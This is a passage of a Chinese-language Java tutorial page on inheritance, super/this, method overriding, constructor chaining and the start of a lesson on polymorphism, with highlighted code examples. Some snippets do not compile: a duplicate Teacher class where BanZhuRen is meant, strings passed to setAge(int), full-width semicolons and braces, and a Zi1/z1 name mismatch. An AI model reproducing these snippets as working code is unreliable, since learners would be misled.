class="keyword">void</span> <span class="title function_">setAge</span><span class="params">(<span class="type">int</span> age)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 子类Teacher类</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Teacher</span> <span class="keyword">extends</span> <span class="title class_">Human</span> &#123;</span><br><span class="line">    <span class="comment">// 工资</span></span><br><span class="line">    <span class="keyword">private</span> <span class="type">double</span> salary ;</span><br><span class="line">    <span class="comment">// 特有方法</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">teach</span><span class="params">()</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;老师在认真教技术！&quot;</span>)；</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">double</span> <span class="title function_">getSalary</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> salary;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setSalary</span><span class="params">(<span class="type">double</span> salary)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.salary = salary;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 子类Student</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Student</span> <span class="keyword">extends</span> <span class="title class_">Human</span>&#123;</span><br><span class="line"> </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 子类BanZhuren类</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Teacher</span> <span class="keyword">extends</span> <span class="title class_">Human</span> &#123;</span><br><span class="line">    <span class="comment">// 工资</span></span><br><span class="line">    <span class="keyword">private</span> <span class="type">double</span> salary ;</span><br><span class="line">       <span class="comment">// 特有方法</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">admin</span><span class="params">()</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;班主任强调纪律问题！&quot;</span>)；</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">double</span> <span class="title function_">getSalary</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> salary;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setSalary</span><span class="params">(<span class="type">double</span> salary)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.salary = salary;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 测试类</span></span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> &#123;</span><br><span class="line">      <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">          <span class="type">Teacher</span> <span class="variable">dlei</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Teacher</span>();</span><br><span class="line">          dlei.setName(<span class="string">&quot;播仔&quot;</span>);</span><br><span class="line">          dlei.setAge(<span class="string">&quot;31&quot;</span>);</span><br><span class="line">          dlei.setSalary(<span class="number">1000.99</span>);</span><br><span class="line">          System.out.println(dlei.getName());</span><br><span class="line">          System.out.println(dlei.getAge());</span><br><span class="line">          System.out.println(dlei.getSalary());</span><br><span class="line">          dlei.teach();</span><br><span class="line">          <span class="type">BanZhuRen</span> <span class="variable">linTao</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BanZhuRen</span>();</span><br><span class="line">          linTao.setName(<span class="string">&quot;灵涛&quot;</span>);</span><br><span class="line">          linTao.setAge(<span class="string">&quot;28&quot;</span>);</span><br><span class="line">          linTao.setSalary(<span class="number">1000.99</span>);</span><br><span class="line">          System.out.println(linTao.getName());</span><br><span class="line">          System.out.println(linTao.getAge());</span><br><span class="line">          System.out.println(linTao.getSalary());</span><br><span class="line">          linTao.admin();</span><br><span class="line"></span><br><span class="line">          <span class="type">Student</span> <span class="variable">xugan</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Student</span>();</span><br><span class="line">          xugan.setName(<span class="string">&quot;播仔&quot;</span>);</span><br><span class="line">          xugan.setAge(<span class="string">&quot;31&quot;</span>);</span><br><span class="line">          <span class="comment">//xugan.setSalary(1000.99); // xugan没有薪水属性，报错！</span></span><br><span class="line">          System.out.println(xugan.getName());</span><br><span class="line">          System.out.println(xugan.getAge());</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
<h4 id="子类不能继承的内容"><a class="header-anchor" href="#子类不能继承的内容">¶</a>子类不能继承的内容</h4>
<ul>
<li>
<p><strong>子类不能继承父类的构造方法。</strong></p>
</li>
<li>
<p><strong>值得注意的是子类可以继承父类的私有成员（成员变量，方法），只是子类无法直接访问而已，可以通过getter/setter方法访问父类的private成员变量</strong></p>
</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Demo03</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">Zi</span> <span class="variable">z</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Zi</span>();</span><br><span class="line">        System.out.println(z.num1);</span><br><span class="line"><span class="comment">//      System.out.println(z.num2); // 私有的子类无法使用</span></span><br><span class="line">        <span class="comment">// 通过getter/setter方法访问父类的private成员变量</span></span><br><span class="line">        System.out.println(z.getNum2());</span><br><span class="line"></span><br><span class="line">        z.show1();</span><br><span class="line">        <span class="comment">// z.show2(); // 私有的子类无法使用</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Fu</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="variable">num1</span> <span class="operator">=</span> <span class="number">10</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> <span class="variable">num2</span> <span class="operator">=</span> <span class="number">20</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">show1</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;show1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">show2</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;show2&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getNum2</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> num2;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setNum2</span><span class="params">(<span class="type">int</span> num2)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.num2 = num2;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Zi</span> <span class="keyword">extends</span> <span class="title class_">Fu</span> &#123;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="继承后的特点——成员变量"><a class="header-anchor" href="#继承后的特点——成员变量">¶</a>继承后的特点——成员变量</h4>
<h5 id="成员变量重名"><a class="header-anchor" href="#成员变量重名">¶</a>成员变量重名</h5>
<ul>
<li>子父类中出现了同名的成员变量时，子类会<strong>优先访问自己对象中的成员变量</strong>。</li>
<li>如果此时想访问父类成员变量→使用<strong>super</strong>关键字</li>
</ul>
<h5 id="super访问父类成员变量"><a class="header-anchor" href="#super访问父类成员变量">¶</a>super访问父类成员变量</h5>
<ul>
<li>
<p>子父类中出现了同名的成员变量时，在子类中需要访问父类中非私有成员变量时，需要使用<code>super</code> 关键字，修饰父类成员变量，类似于之前学过的 <code>this</code></p>
</li>
<li>
<p>注意：<strong>super代表的是父类对象的引用，this代表的是当前对象的引用</strong></p>
</li>
<li>
<p><code>super.父类成员变量名</code></p>
</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Fu</span> &#123;</span><br><span class="line">        <span class="comment">// Fu中的成员变量。</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">num</span> <span class="operator">=</span> <span class="number">5</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Zi</span> <span class="keyword">extends</span> <span class="title class_">Fu</span> &#123;</span><br><span class="line">        <span class="comment">// Zi中的成员变量</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">num</span> <span class="operator">=</span> <span class="number">6</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">show</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">num</span> <span class="operator">=</span> <span class="number">1</span>;</span><br><span class="line">        <span class="comment">// 访问方法中的num</span></span><br><span class="line">        System.out.println(<span class="string">&quot;method num=&quot;</span> + num);</span><br><span class="line">        <span class="comment">// 访问子类中的num</span></span><br><span class="line">        System.out.println(<span class="string">&quot;Zi num=&quot;</span> + <span class="built_in">this</span>.num);</span><br><span class="line">        <span class="comment">// 访问父类中的num</span></span><br><span class="line">        System.out.println(<span class="string">&quot;Fu num=&quot;</span> + <span class="built_in">super</span>.num);</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Demo04</span> &#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">              <span class="comment">// 创建子类对象</span></span><br><span class="line">                <span class="type">Zi1</span> <span class="variable">z</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Zi1</span>();</span><br><span class="line">              <span class="comment">// 调用子类中的show方法</span></span><br><span class="line">                z1.show();</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">演示结果：</span><br><span class="line">method num=<span class="number">1</span></span><br><span class="line">Zi num=<span class="number">6</span></span><br><span class="line">Fu num=<span class="number">5</span></span><br></pre></td></tr></table></figure>
<ul>
<li>如何访问父类的私有成员变量→在父类中提供公共的getXxx方法和setXxx方法</li>
</ul>
<h5 id="成员方法重名"><a class="header-anchor" href="#成员方法重名">¶</a>成员方法重名</h5>
<ul>
<li>如果子类父类中出现<strong>重名</strong>的成员方法，则创建子类对象调用该方法的时候，子类对象会优先调用自己的方法</li>
</ul>
<h3 id="方法重写"><a class="header-anchor" href="#方法重写">¶</a>方法重写</h3>
<ul>
<li>子类中出现与父类一模一样的方法时（返回值类型，方法名和参数列表都相同），会出现覆盖效果，也称为重写或者复写。<strong>声明不变，重新实现</strong></li>
</ul>
<h4 id="使用场景与案例"><a class="header-anchor" href="#使用场景与案例">¶</a>使用场景与案例</h4>
<ul>
<li>子类继承了父类的方法，但是子类觉得父类的这方法不足以满足自己的需求，子类重新写了一个与父类同名的方法，以便覆盖父类的该方法</li>
</ul>
<h4 id="Override重写注解"><a class="header-anchor" href="#Override重写注解">¶</a>@Override重写注解</h4>
<ul>
<li>这个注解标记的方法，就说明这个方法必须是重写父类的方法，否则编译阶段报错。</li>
<li>建议重写都加上这个注解，一方面可以提高代码的可读性，一方面可以防止重写出错</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Cat</span> <span class="keyword">extends</span> <span class="title class_">Animal</span> &#123;</span><br><span class="line">     <span class="comment">// 声明不变，重新实现</span></span><br><span class="line">    <span class="comment">// 方法名称与父类全部一样，只是方法体中的功能重写写了！</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">cry</span><span class="params">()</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;我们一起学猫叫，喵喵喵！喵的非常好听！&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="注意事项"><a class="header-anchor" href="#注意事项">¶</a>注意事项</h4>
<ol>
<li>方法重写是发生在<strong>子父类之间</strong>的关系。</li>
<li>子类方法<strong>覆盖父类方法</strong>，必须要保证权限大于等于父类权限。</li>
<li>子类方法覆盖父类方法，<strong>返回值类型、函数名和参数列表都要一模一样</strong>。</li>
</ol>
<h3 id="继承后的特点——构造方法"><a class="header-anchor" href="#继承后的特点——构造方法">¶</a>继承后的特点——构造方法</h3>
<ol>
<li>构造方法的名字是与类名一致的。所以子类是无法继承父类构造方法的。</li>
<li>构造方法的作用是初始化对象成员变量数据的。所以子类的初始化过程中，必须先执行父类的初始化动作。子类的构造方法中默认有一个<code>super()</code> ，表示调用父类的构造方法，父类成员变量初始化后，才可以给子类使用。（<strong>先有爸爸，才能有儿子</strong>）</li>
</ol>
<ul>
<li><strong>继承后子类构方法器特点:子类所有构造方法的第一行都会默认先调用父类的无参构造方法</strong></li>
</ul>
<h3 id="super-和this"><a class="header-anchor" href="#super-和this">¶</a>super()和this()</h3>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="built_in">this</span>.成员变量            --    本类的</span><br><span class="line"><span class="built_in">super</span>.成员变量            --    父类的</span><br><span class="line"></span><br><span class="line"><span class="built_in">this</span>.成员方法名()          --    本类的    </span><br><span class="line"><span class="built_in">super</span>.成员方法名()   --    父类的</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line"><span class="built_in">super</span>(...) -- 调用父类的构造方法，根据参数匹配确认</span><br><span class="line"><span class="built_in">this</span>(...) -- 调用本类的其他构造方法，根据参数匹配确认</span><br></pre></td></tr></table></figure>
<h4 id="super"><a class="header-anchor" href="#super">¶</a>super()</h4>
<ul>
<li><strong>注意：</strong>
<ul>
<li>-<strong>子类的每个构造方法中均有默认的super()，调用父类的空参构造。手动调用父类构造会覆盖默认的super()。</strong></li>
<li><strong>super() 和 this() 都必须是在构造方法的第一行，所以不能同时出现。</strong></li>
<li>super(…)是根据参数去确定调用父类哪个构造方法的。</li>
</ul>
</li>
</ul>
<h4 id="this"><a class="header-anchor" href="#this">¶</a>this()</h4>
<ul>
<li>默认是去找本类中的其他构造方法，根据参数来确定具体调用哪一个构造方法。</li>
<li>为了借用其他构造方法的功能</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.itheima._08this和<span class="built_in">super</span>调用构造方法;</span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">*  this(...):</span></span><br><span class="line"><span class="comment">*  默认是去找本类中的其他构造方法，根据参数来确定具体调用哪一个构造方法。</span></span><br><span class="line"><span class="comment">*  为了借用其他构造方法的功能。</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ThisDemo01</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">Student</span> <span class="variable">xuGan</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Student</span>();</span><br><span class="line">        System.out.println(xuGan.getName()); <span class="comment">// 输出:徐干</span></span><br><span class="line">        System.out.println(xuGan.getAge());<span class="comment">// 输出:21</span></span><br><span class="line">        System.out.println(xuGan.getSex());<span class="comment">// 输出： 男</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Student</span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String name ;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> age ;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">char</span> sex ;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Student</span><span class="params">()</span> &#123;</span><br><span class="line">  <span class="comment">// 很弱，我的兄弟很牛逼啊，我可以调用其他构造方法：Student(String name, int age, char sex)</span></span><br><span class="line">        <span class="built_in">this</span>(<span class="string">&quot;徐干&quot;</span>,<span class="number">21</span>,<span class="string">&#x27;男&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Student</span><span class="params">(String name, <span class="type">int</span> age, <span class="type">char</span> sex)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.name = name ;</span><br><span class="line">        <span class="built_in">this</span>.age = age   ;</span><br><span class="line">        <span class="built_in">this</span>.sex = sex   ;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setName</span><span class="params">(String name)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getAge</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setAge</span><span class="params">(<span class="type">int</span> age)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">char</span> <span class="title function_">getSex</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> sex;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setSex</span><span class="params">(<span class="type">char</span> sex)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.sex = sex;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="小结"><a class="header-anchor" href="#小结">¶</a>小结</h4>
<ul>
<li><strong>子类的每个构造方法中均有默认的super()，调用父类的空参构造。手动调用父类构造会覆盖默认的super()。</strong></li>
<li><strong>super() 和 this() 都必须是在构造方法的第一行，所以不能同时出现。</strong></li>
<li><strong>super(…)和this(…)是根据参数去确定调用父类哪个构造方法的。</strong></li>
<li>super(…)可以调用<u>父类构造方法</u>初始化继承自父类的成员变量的数据。</li>
<li>this(…)可以调用<u>本类中的其他构造方法</u>。</li>
</ul>
<h3 id="继承的特点"><a class="header-anchor" href="#继承的特点">¶</a>继承的特点</h3>
<ol>
<li>Java只支持单继承，不支持多继承。</li>
<li>一个类可以有多个子类。</li>
<li>可以多层继承。</li>
</ol>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">A</span> &#123;&#125;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">C1</span> <span class="keyword">extends</span> <span class="title class_">A</span> &#123;&#125;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">D</span> <span class="keyword">extends</span> <span class="title class_">C1</span> &#123;&#125;</span><br></pre></td></tr></table></figure>
<p><strong>分享书写技巧：</strong></p>
<p>​        1.在大脑中要区分谁是父，谁是子</p>
<p>​        2.把共性写到父类中，独有的东西写在子类中</p>
<p>​        3.开始编写标准Javabean（从上往下写）</p>
<p>​        4.在测试类中，创建对象并赋值调用</p>
<h2 id="Day14-面向对象进阶（多态-包-final-权限修饰符-代码块）"><a class="header-anchor" href="#Day14-面向对象进阶（多态-包-final-权限修饰符-代码块）">¶</a>Day14 面向对象进阶（多态&amp;包&amp;final&amp;权限修饰符&amp;代码块）</h2>
<h3 id="学习目标-v2"><a class="header-anchor" href="#学习目标-v2">¶</a>学习目标</h3>
<ul>
<li>能够说出使用多态的前提条件</li>
<li>理解多态的向上转型</li>
<li>理解多态的向下转型</li>
<li>能够知道多态的使用场景</li>
<li>包的作用</li>
<li>public和private权限修饰符的作用</li>
<li>描述final修饰的类的特点</li>
<li>描述final修饰的方法的特点</li>
<li>描述final修饰的变量的特点</li>
</ul>
<h3 id="多态"><a class="header-anchor" href="#多态">¶</a>多态</h3>
<ul>
<li>格式</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">父类类型 变量名 = <span class="keyword">new</span> 子类/实现类构造器;</span><br><span class="line">变量名.方法名();</span><br></pre></td></tr></table></figure>
<ul>
<li>
<p>前提</p>
<ul>
<li>有继承关系，子类对象是可以赋值给父类类型的变量。</li>
<li>例如Animal是一个动物类型，而Cat是一个猫类型。Cat继承了Animal，Cat对象也是Animal类型，自然可以赋值给父类类型的变量</li>
</ul>
</li>
<li>
<p>有了多态之后，方法的形参就可以定义为<strong>共同的父类Person</strong></p>
</li>
<li>
<p>注意</p>
<ul>
<li>当一个方法的形参是一个<strong>类</strong>，我们可以传递<strong>这个类所有的子类对象</strong></li>
<li>当一个方法的形参是一个<strong>接口</strong>，我们可以传递这个<strong>接口所有的实现类对象</strong></li>
<li>而且多态还可以<strong>根据传递的不同对象</strong>来<strong>调用不同类中的方法</strong></li>
</ul>
</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 父类：</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Person</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> age;</span><br><span class="line"></span><br><span class="line">    空参构造</span><br><span class="line">    带全部参数的构造</span><br><span class="line">    get和set方法</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">show</span><span class="params">()</span>&#123;</span><br><span class="line">        System.out.println(name + <span class="string">&quot;, &quot;</span> + age);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 子类1：</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Administrator</span> <span class="keyword">extends</span> <span class="title class_">Person</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">show</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;管理员的信息为：&quot;</span> + getName() + <span class="string">&quot;, &quot;</span> + getAge());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 子类2：</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Student</span> <span class="keyword">extends</span> <span class="title class_">Person</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">show</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;学生的信息为：&quot;</span> + getName() + <span class="string">&quot;, &quot;</span> + getAge());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 子类3：</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Teacher</span> <span class="keyword">extends</span> <span class="title class_">Person</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">show</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;老师的信息为：&quot;</span> + getName() + <span class="string">&quot;, &quot;</span> + getAge());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 测试类：</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="comment">//创建三个对象，并调用register方法</span></span><br><span class="line"></span><br><span class="line">        <span class="type">Student</span> <span class="variable">s</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Student</span>();</span><br><span class="line">        s.setName(<span class="string">&quot;张三&quot;</span>);</span><br><span class="line">        s.setAge(<span class="number">18</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">Teacher</span> <span class="variable">t</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Teacher</span>();</span><br><span class="line">        t.setName(<span class="string">&quot;王建国&quot;</span>);</span><br><span class="line">        t.setAge(<span class="number">30</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">Administrator</span> <span class="variable">admin</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Administrator</span>();</span><br><span class="line">        admin.setName(<span class="string">&quot;管理员&quot;</span>);</span><br><span class="line">        admin.setAge(<span class="number">35</span>);</span><br><span class="line"></span><br><span class="line">        register(s);</span><br><span class="line">        register(t);</span><br><span class="line">        register(admin);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//这个方法既能接收老师，又能接收学生，还能接收管理员</span></span><br><span class="line">    <span class="comment">//只能把参数写成这三个类型的父类</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">register</span><span class="params">(Person p)</span>&#123;</span><br><span class="line">        p.show();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>
<p>定义</p>
<ul>
<li>多态是指同一行为，具有多个不同表现形式</li>
</ul>
</li>
<li>
<p>前提</p>
<ul>
<li>有继承或者实现关系</li>
<li>方法的重写【意义体现：不重写，无意义】</li>
<li>父类引用指向子类对象【格式体现】</li>
</ul>
<blockquote>
<p>父类类型：指子类对象继承的父类类型，或者实现的父接口类型。</p>
</blockquote>
</li>
<li>
<p>运行特点</p>
<ul>
<li>调用成员变量时
<ul>
<li>编译看左边，运行看左边</li>
</ul>
</li>
<li>调用成员方法时
<ul>
<li>编译看左边，运行看右边</li>
</ul>
</li>
</ul>
</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Fu</span> <span class="variable">f</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Zi</span>();</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line"><span class="comment">//编译看左边的父类中有没有name这个属性，没有就报错</span></span><br><span class="line"><span class="comment">//在实际运行的时候，把父类name属性的值打印出来</span></span><br><span class="line">System.out.println(f.name);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//编译看左边的父类中有没有show这个方法，没有就报错</span></span><br><span class="line"><span class="comment">//在实际运行的时候，运行的是子类中的show方法</span></span><br><span class="line">f.show();</span><br></pre></td></tr></table></figure>
<ul>
<li>弊端
<ul>
<li>多态编译阶段是看左边父类类型</li>
<li>如果子类有些独有的功能，此时<strong>多态的写法就无法访问子类独有功能了</strong></li>
</ul>
</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Animal</span>&#123;</span><br><span class="line">    <span class="keyword">public</span>  <span class="keyword">void</span> <span class="title function_">eat</span><span class="params">()</span>｛</span><br><span class="line">        System.out.println(<span class="string">&quot;动物吃东西！&quot;</span>)</span><br><span class="line">    ｝</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Cat</span> <span class="keyword">extends</span> <span class="title class_">Animal</span> &#123;    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">eat</span><span class="params">()</span> &#123;        System.out.println(<span class="string">&quot;吃鱼&quot;</span>);    &#125;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">catchMouse</span><span class="params">()</span> &#123;        System.out.println(<span class="string">&quot;抓老鼠&quot;</span>);    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Dog</span> <span class="keyword">extends</span> <span class="title class_">Animal</span> &#123;    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">eat</span><span class="params">()</span> &#123;        System.out.println(<span class="string">&quot;吃骨头&quot;</span>);    &#125;  </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Test</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>&#123;</span><br><span class="line">        <span class="type">Animal</span> <span class="variable">a</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Cat</span>();</span><br><span class="line">        a.eat();</span><br><span class="line">        a.catchMouse();<span class="comment">//编译报错，编译看左边，Animal没有这个方法</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
